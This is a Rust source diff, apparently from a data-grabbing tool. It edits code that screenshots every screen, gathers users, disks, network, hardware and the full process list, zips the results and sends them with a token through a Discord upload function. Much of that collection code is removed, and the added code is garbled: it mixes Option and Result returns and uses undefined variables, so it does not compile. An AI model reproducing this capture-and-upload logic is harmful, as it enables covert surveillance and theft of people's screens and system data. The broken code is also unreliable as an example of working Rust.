@@ -1,12 +1,57 @@
 use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
 use super::{
-    discord, global
+    discord, global, zip
 };
 
-// Define global variables
-lazy_static::lazy_static! {
-    pub static ref ZIP_PATH: String = sha256::digest(global::get_time().as_nanos().to_string());
+struct Files {}
+impl Files {
+    pub fn new() -> Self {
+        return Self 
+    }
+
+    // Create a new file
+    pub fn mkdir(path: &str) -> Result<_, Error> {
+        return match std::fs::create_dir_all(path) {
+            Ok(_) => Ok(()),
+            Err(e) => Err(e)
+        };
+    }
+
+    pub fn read_file(&self, path: &str) -> Result<Vec<u8>, Error> {
+        return match std::fs::read(path) {
+            Ok(f) => Some(f),
+            Err(e) => Err(e)
+        }
+    }
+
+    pub fn encode_png(&self, buf: &[u8]) -> Result<String, Error> {
+        return match base64::encode(buf) {
+            Ok(f) => Some(format!(
+                "data:image/png;base64,{f}",
+            )),
+            Err(e) => Err(e)
+        }
+    }
+
+    // Capture a screenshot and save it to the current folder
+    fn capture_image(time: &str) -> Result<&Vec<u8>, Error> {
+        let screens = match screenshots::Screen::all() {
+            Some(s) => s,
+            None => Err("failed to get screens")
+        };
+
+        // Iterate through all the screens
+        let mut buf: &Vec<u8> = &Vec::new();
+        screens.iter().for_each(|s| {
+            buf = match s.capture() {
+                Ok(f) => f.buffer(),
+                Err(e) => Err(e)
+            }
+        });
+        return Ok(buf);
+    }
 }
+
 
 /*
 
@@ -19,16 +64,6 @@ lazy_static::lazy_static! {
 //
 // token: The provided vac token
 fn main(token: &str) {
-
-    //////////////////////////////////
-    //                              //
-    //  Define then pass to thread  //
-    //                              //
-    //////////////////////////////////
-    
-    // Create the new zip file
-    let mut zip = create_zip_file();
-
     //////////////////////////////////
     //                              //
     //  The below is in the thread  //
@@ -38,163 +73,13 @@ fn main(token: &str) {
     // Create a new system struct
     let mut sys: System = System::new_all();
 
-    // Refresh this for every loop in thread
-    let current_time: String = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
-
     // Take a scrteenshot
-    let image_buffer: String = take_screenshot(&mut zip, &current_time);
+    let img_buf: String = capture_screenshot(&mut zip, &time);
 
     // Get the system information
-    get_sys_info(&mut zip, &mut sys, &current_time);
+    get_sys_info(&mut zip, &mut sys, &time);
 
     // Send the files to discord
-    let image_data: String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
-    let zip_data: String = format!("data:application/zip;base64,{}", base64::encode(&std::fs::read(ZIP_PATH.to_string() + ".zip").expect("failed to read zip file")).to_string());
+    
     discord::send_files(token, &image_data, &zip_data);
-
-}
-
-// Create a new folder with the current time as it's name
-fn create_new_folder(name: &str) {
-    std::fs::create_dir(name).expect("failed to create folder");
-}
-
-// Take a screenshot and save it to the current folder
-fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>, current_time: &str) -> String {
-    let screens = screenshots::Screen::all().expect("failed to get screens");
-
-    // Iterate through all the screens
-    let mut image_to_send_in_api: String = String::new();
-    screens.iter().for_each(|s| {
-        // Capture the screen and get the image buffer
-        let image = s.capture().expect("failed to capture screen");
-        let image_buffer = image.buffer();
-
-        // Add the image to the zip file
-        add_to_zip_file(
-            zip, 
-            &format!("{}_{}.png", s.display_info.id, current_time), 
-            &image_buffer
-        );
-
-        // Send this in the request body to our api
-        image_to_send_in_api = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
-    });
-    return image_to_send_in_api;
-}
-
-// Add a file to the zip file
-fn add_to_zip_file(
-    zip: &mut zip::ZipWriter<std::fs::File>, file_name: &str, file_content: &Vec<u8>
-) {
-
-    // Add a file to the zip file
-    match zip.start_file(file_name, zip::write::FileOptions::default()) {
-        Ok(f) => f,
-        Err(e) => panic!("Error: {}", e)
-    };
-
-    // Write the file to the zip file
-    std::io::Write::write_all(zip, file_content)
-        .expect("failed to write to zip file");
-}
-
-// Create a zip file
-fn create_zip_file() -> zip::ZipWriter<std::fs::File> {
-    // Create a new zip file
-    let zip_file = match std::fs::File::create(ZIP_PATH.to_string() + ".zip") {
-        Ok(f) => f,
-        Err(e) => panic!("Error: {}", e)
-    };
-
-    // Return the zip writer
-    return zip::ZipWriter::new(zip_file);
-}
-
-// The get_sys_info function is used to get the system information
-// and return it as a string.
-fn get_sys_info(
-    zip: &mut zip::ZipWriter<std::fs::File>, sys: &mut System, current_time: &str
-) {
-    // Refresh system information
-    sys.refresh_all();
-
-    // Create a new string to store the system information
-    let mut result: String = String::new();
-
-    // Append the users to the result string
-    result.push_str(&format!("\n\nUsers:\n\n"));
-    sys.users().iter().for_each(|u| {
-        result.push_str(&format!("    {:?}\n", u));
-    });
-
-    // Append the system disks to the result string
-    result.push_str(&format!("Disks:\n\n"));
-    sys.disks().iter().for_each(|d| {
-        result.push_str(&format!("    {:?}\n", d));
-    });
-
-    // Append the network interfaces name, data received 
-    // and data transmitted to the result string
-    result.push_str(&format!("\n\nNetworks:\n\n"));
-    for (name, data) in sys.networks() {
-        result.push_str(
-            &format!("    {} => Recieved: {} => Transmitted: {}\n", name, data.received(), data.transmitted())
-        );
-    }
-
-    // Append the system components to the result string
-    result.push_str(&format!("\n\nComponents:\n\n"));
-    sys.components().iter().for_each(|c| {
-        result.push_str(&format!("{:?}", c))
-    });
-
-    // Append the system components to the result string
-    result.push_str(&format!("\n\nHardware Information:\n\n"));
-    result.push_str(&format!("
-        Total Memory: {} bytes
-        Used Memory: {} bytes
-        Total Swap: {} bytes
-        Used Swap: {} bytes
-        Boot Time: {} seconds
-        Up Time: {:?}
-
-        System Name: {:?}
-        System Kernel Version: {:?}
-        System OS Version: {:?}
-        System Host Name: {:?}
-        Distribution ID: {:?}
-        Global CPU Info: {:?}
-        Available Memory: {:?}
-        Number of CPUs: {:?}
-    ", 
-        sys.total_memory(), sys.used_memory(), sys.total_swap(), sys.used_swap(), sys.boot_time(),
-        sys.uptime(), sys.name(), sys.kernel_version(), sys.long_os_version(), sys.host_name(),
-        sys.distribution_id(), sys.global_cpu_info(), sys.available_memory(), sys.physical_core_count()
-    ));
-
-    // Append the system processes to the result string
-    result.push_str(&format!("\n\nProcesses:\n\n"));
-    for (pid, process) in sys.processes() {
-        println!("Process {:?}:", process);
-        result.push_str(&format!(
-            "Process [{pid}]:
-                Name: {}
-                Disk Usage: {:?}
-                Memory Usage: {}
-                Virtual Memory: {}
-                CPU Usage: {}
-                Status: {}
-                Start Time: {}
-                Run Time: {}
-            ",
-            process.name(), process.disk_usage(), process.memory(), process.virtual_memory(), 
-            process.cpu_usage(), process.status(), process.start_time(), process.run_time()
-        ));
-    }
-
-    // Add to the zip file
-    add_to_zip_file(
-        zip, &format!("{}_sys_info.txt", current_time), &result.as_bytes().to_vec()
-    );
 }
